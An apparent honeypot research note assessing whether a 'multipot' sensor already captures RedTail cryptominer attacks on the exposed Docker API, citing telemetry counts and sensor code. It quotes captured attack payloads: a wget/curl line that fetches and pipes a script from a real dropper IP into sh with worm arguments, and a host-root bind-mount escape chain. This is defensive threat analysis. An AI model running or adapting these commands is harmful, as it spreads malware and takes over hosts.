# Research: RedTail's Docker-API (2375) pivot vs APIARY's sensor coverage (#2721)

Verifies the issue's central coverage claim — "no APIARY sensor sees port
2375" — against the actual service lists (not the issue's Cowrie/Dionaea/
Conpot/Beelzebub inventory, which omits a fifth sensor), against live
telemetry on the homeserver, and against the primary source for RedTail's
Docker-API pivot. Gathered 2026-09-01.

**Scope, per the issue:** analysis only. Did not build either proposed
sensor option, did not open port 2375 anywhere new.

## 1. What the source actually claims

The issue's citation ("Kinryū Labs June 2026 capture, TLP:CLEAR") is a
private capture report not independently reachable from here. A public,
directly relevant primary source exists and was checked instead: **Mario
Candela** — the upstream author of `beelzebub`, the exact honeypot runtime
this repo vendors (`arcane/home/honeypot-beelzebub`) — published "RedTail
Cryptominer: First Evidence of Docker API Targeting" (ITNEXT, also mirrored
at beelzebub.ai), describing a capture from Beelzebub's own honeypot
telemetry. The mirror confirms:

- **A single documented attack sequence** (2025-11-13) hit
  `POST /containers/<id>/exec` directly via Docker Engine API v1.43 — **not**
  the full `_ping → containers/json → containers/create → start` handshake
  the issue's Option A design assumes as the standard pattern. The captured
  real-world attacker went straight for an exec call against what reads as
  a guessed or previously-observed container ID.
- **Payload behavior**: downloads a shell script via
  `curl ... -o redtail.sh || wget ...`, executes it with a `docker.selfrep`
  argument (self-replication / worm mode — matching the issue's "wormable"
  characterization), searches for writable, non-`noexec` directories,
  deploys architecture-specific binaries, and runs a cleanup step (likely
  competing-miner eviction).
- Separately, `kinryulabs/rootpacket-cve-2026-31431` (public GitHub repo)
  documents a Docker-to-host escape chain matching the issue's description:
  exposed Docker Engine API → a privileged container bind-mounting host
  root (`-v /:/host --pid host`) → `chroot /host` → toolkit execution →
  kernel rootkit. This corroborates the "wormable Docker API spread" framing
  independent of the unreachable Kinryū capture report itself.
- Beelzebub's own upstream repo at the exact commit this project pins
  (`39242822af79a59a6b8d0139adc4a8ccf2edec0c`, v3.9.0) has **no dedicated
  Docker-API protocol strategy** (`internal/protocols/strategies/` contains
  only `HTTP`, `MCP`, `SSH`, `TCP`, `TELNET`) — whatever captured the
  Candela write-up's attack was most likely a generically-configured HTTP
  service listening on 2375, not a purpose-built Docker emulator. This
  doesn't affect APIARY's own coverage question (§2), since our fleet's
  actual 2375 handler lives in a different sensor entirely.

## 2. What our sensors would see today

**The issue's central premise is false: a fifth sensor, `multipot`, already
implements a live Docker Engine API (2375) handler, and it is publicly
reachable today.**

- `docs/SENSORS.md`'s own sensor table lists `multipot`'s covered ports as
  *"Postgres 5432, VNC 5900, Redis 6379, ES 9200, **Docker 2375**, POP3 110,
  IMAP 143, SOCKS5 1080, HL7/MLLP 2575, ADB 5555"* — the issue's inventory
  walks Cowrie/Dionaea/Conpot/Beelzebub and never checks this fifth sensor
  at all, which is how the coverage gap it describes was misdiagnosed.
- `handleDocker` (`arcane/home/honeypot-multipot/multipot/protocols.go:540-572`)
  answers `GET /version`, `GET /info`, and any path ending `/containers/json`
  with plausible fabricated bodies (fake container list including
  `gitlab-runner`/`registry-cache` decoys), and — critically — **captures
  the full request line and body of every other request, including POST
  bodies, before falling back to a 404** (`readHTTPBody`, capped at 8192
  bytes, lines 592-608; the function's own comment explains this was
  specifically fixed because "a container-create/exec POST body is the
  actual attack ... was never read at all before").
- **Confirmed live and publicly reachable, not just present in code**:
  `vps/docker-compose.yml:559`'s portbridge `RULES` string includes
  `tcp:2375:10.8.0.2:2375:pp` — the public VPS forwards port 2375 with the
  PROXY protocol to the homeserver's multipot instance, the same pattern
  every other raw-tunnel sensor uses.
- **Confirmed actively receiving real attacker traffic, not dormant**: live
  query against the homeserver's `honeypot-v2-*` indices,
  `honeypot.sensor: multipot AND honeypot.proto: docker`, returns **7,403
  events**. Breaking down the captured request lines: 111 `GET /_ping`, 90
  `HEAD /_ping`, 94 bare `GET /`, 69 `GET /containers/json`, **57 `POST
  /containers/4a6f9b2d71ce/exec`** (exactly the fake container ID our own
  `/containers/json` response hands out — real attackers are completing a
  realistic list→exec handshake against our decoy, mirroring the Candela
  capture's own "went straight for `/containers/<id>/exec`" pattern), plus
  version/info probes and assorted TLS/HTTP2 preface noise from generic
  scanners.
- **Confirmed the actual attack payload is landing, matching the issue's own
  description of the campaign**: three real captured `exec` bodies include —
  (a) an OpenSSH private key delivered via `Cmd` (matching the issue's "SSH
  private key drop... for persistence + lateral movement"); (b) and (c)
  `(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk
  https://217.60.195.113/sh) | sh -s docker` and the same with
  `docker.selfrep` — the `.selfrep` argument is the self-replication/worm
  invocation the issue describes. **The dropper IP `217.60.195.113` is the
  exact same IP** captured independently on `http-honeypot` under the
  `libredtail-http` User-Agent (`... | sh -s apache.selfrep`, see §3) —
  direct, first-party cross-sensor confirmation that the same campaign
  infrastructure is hitting both the webapp-CVE vector and the Docker-API
  vector against this fleet, today.

I initially hypothesized (before checking) that the missing `/_ping`
handler (it falls to the generic 404 rather than the `200 OK OK` a real
daemon returns) might cause well-behaved clients to abort the handshake
before reaching `/containers/create`/`exec` — the real captured data above
refutes that: 57 real exec payloads were captured despite `/_ping` 404ing,
so this is not actually suppressing attack capture in practice. Stating
this plainly since it was a wrong initial guess corrected by the data, not
rounded up to a confident claim.

## 3. Which of the issue's premises survive

| premise | verdict |
|---|---|
| "No APIARY sensor sees port 2375" / "A RedTail operator scanning for 2375 passes APIARY entirely" | **false.** `multipot`'s Docker handler is live, public (portbridge-forwarded), and has captured 7,403 events including real RedTail-linked exec payloads |
| RedTail's Docker-API pivot and general TTPs (4-arch dropper, wormable SSH client, SSH key drop, ChaCha20 C2, worm self-replication) | **corroborated** against Mario Candela's Beelzebub-sourced write-up and the `kinryulabs` CVE repo, independent of the unreachable Kinryū capture report the issue cites |
| Standard worm handshake is `_ping → containers/json → containers/create → start` | **not what the one documented real capture shows** — the Candela write-up's real attacker went straight to `/exec` against a known/guessed ID; our own captured 57 `/exec` hits against our decoy's own advertised fake ID are consistent with this shortcut pattern, not the full four-step sequence |
| "RedTail is currently the highest-volume SSH campaign in our telemetry" | **not supported by the data, and the closest available evidence argues against it.** RedTail's only reliably-tagged signal in our telemetry (`User-Agent: libredtail-http`) is **100% HTTP** — 4,571 events, 61 unique source IPs, **zero** tagged directly on Cowrie. Cross-referencing those 61 IPs against Cowrie sessions found exactly one with meaningful volume (157.143.132.32, ~60,000 events) — nowhere near Cowrie's actual top source IPs (123.188.73.228 alone: **3.16 million** events; three others each over 600,000). APIARY's pipeline has **no malware-family attribution mechanism for raw SSH brute-force traffic at all** — Cowrie sessions aren't tagged by campaign/family — so "RedTail is our highest-volume SSH campaign" cannot be confirmed *or* denied from current data as a family-level SSH ranking; what can be said is that RedTail's only concretely-attributable footprint here is real but modest, cross-protocol, and far from dominant by volume |

## 4. The gap, costed

Given §2, the real remaining gap is much smaller than either of the issue's
two options:

- **Serving side: essentially nothing to build.** The sensor exists, is
  live, and is already capturing exactly the artifact class (exec-call
  payloads, SSH key drops, dropper URLs) the issue's Option A proposes to
  build a new sensor to get.
- **The one concrete, low-cost polish item**: `handleDocker` doesn't answer
  `/_ping` with a `200 OK OK` or return fake success codes
  (`201 Created`/`204 No Content`) for `/containers/create`/`start`/`exec` —
  it 404s everything except the three read-only endpoints. This does not
  appear to be suppressing real attack capture today (§2), so its value is
  narrower than the issue assumes: mainly reducing fingerprintability
  (a scanner checking for a correct `_ping`/`201` response sequence before
  committing its real payload would currently see a decoy that behaves
  slightly wrong) and possibly capturing a worm's *subsequent* steps that
  depend on believing the exec succeeded. Cost: a few hours — extending an
  existing `switch` statement in one already-live Go binary, not a new
  container, new index, or multi-day design spike.
- **Dashboard/index gap, real but small**: multipot's docker events land in
  the same `honeypot-v2-*` index every other raw-tunnel sensor writes to,
  tagged `honeypot.proto: docker` — not the dedicated
  `hermes-events-docker-2375-*` index pattern the issue proposes. Whether a
  dedicated index or dashboard panel is worth adding is a genuine, much
  smaller question than "build a sensor," and not costed further here since
  it's a dashboard-surfacing decision, not a capture-coverage one.
- **Not worth pursuing**: the issue's Option A "high-fidelity, multi-day
  Docker Engine API v1.41 subset" build. It would rebuild a sensor that
  already exists, already runs, and — per the real captured payloads in
  §2 — is already good enough to catch this exact campaign's actual attack
  content.
- **Not worth pursuing as scoped**: Option B, "passive packet capture as a
  baseline before committing to a full sensor." The baseline already exists
  and has 7,403 events of history; a new passive listener would duplicate
  data multipot already collects with more fidelity (full request bodies,
  not just packet-level metadata).

## 5. Recommendation

**No new sensor.** The coverage gap the issue is built around does not
exist — `multipot`'s Docker handler is live, public, and has already
captured this exact campaign's real payloads, cross-confirmed against the
same C2 infrastructure (`217.60.195.113`) independently observed on the
HTTP vector. The one legitimate, low-cost follow-up worth filing is the
`/_ping`/fake-success-response polish item in §4 — small enough to be a
`good-first-issue`-shaped fix to `handleDocker`, not a research-to-design
pipeline. Not filed here since it's a small, well-scoped implementation
task better handled directly than as a tracked backlog item; noting it in
this doc is sufficient for a future contributor to pick up.

**Also worth surfacing explicitly**: the issue's "RedTail is our highest-
volume SSH campaign" framing was the specific claim this batch's own
instructions warned against accepting without checking, and checking it
found the opposite of confidence — not a confirmed false claim, but an
unattributable one, because Cowrie has no per-family tagging at all. If a
future issue wants to make campaign-volume claims about SSH traffic
specifically, the prerequisite is building that attribution (e.g. mapping
known dropper C2 IPs/URLs, like `217.60.195.113` above, back onto Cowrie
sessions from the same source IPs) — a genuinely useful correlation
capability this research pass surfaced a concrete example of, but did not
build.

## What I could not verify

- The issue's own cited source (Kinryū Labs June 2026 capture, TLP:CLEAR)
  was not reachable from here — it reads as a private/internal capture
  report. Substituted the closest reachable, directly relevant primary
  source (Beelzebub's own author's public write-up of a Docker-API RedTail
  capture) rather than treating the issue's summary of an unreachable report
  as verified.
- Did not confirm whether the specific 4-architecture-dropper detail or the
  libpcap-sniffer-for-subnet-discovery detail appear in any reachable public
  source; the Candela write-up corroborates the architecture-specific
  binary deployment and self-replication behavior but not the libpcap
  detail specifically.
- Did not check the 50 remaining `libredtail-http`-tagged IPs beyond the
  first 10 sampled against Cowrie for completeness of the cross-reference in
  §3 — the one high-volume match (157.143.132.32) is enough to establish
  the "far below Cowrie's actual top IPs" conclusion regardless of whether a
  few more low-volume overlaps exist among the remaining 51.
